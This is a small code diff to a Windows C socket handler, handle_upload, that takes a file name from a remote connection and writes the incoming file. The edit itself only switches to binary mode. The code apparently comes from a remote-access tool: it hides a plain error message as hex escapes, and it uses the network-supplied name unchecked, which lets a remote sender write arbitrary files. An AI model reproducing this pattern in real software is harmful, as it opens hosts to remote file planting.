@@ -200,7 +200,6 @@ closeup:
 void handle_upload(SOCKET sock) {
     char name[256];
     int received;
-    FILE* fp;
 
     // Clear the buffer and receive the filename
     ZeroMemory(bufferin, sizeof(bufferin));
@@ -215,7 +214,7 @@ void handle_upload(SOCKET sock) {
         *newline = '\0';
     }
     // Open the file for writing
-    fp = fopen(name, "w");
+    FILE* fp = fopen(name, "wb");
     if (fp == NULL) {
         send(sock, "\x45\x72\x72\x6f\x72\x20\x6f\x70\x65\x6e\x69\x6e\x67\x20\x66\x69\x6c\x65\x20\x66\x6f\x72\x20\x77\x72\x69\x74\x69\x6e\x67\x0a", strlen("\x45\x72\x72\x6f\x72\x20\x6f\x70\x65\x6e\x69\x6e\x67\x20\x66\x69\x6c\x65\x20\x66\x6f\x72\x20\x77\x72\x69\x74\x69\x6e\x67\x0a"), 0);
         return;
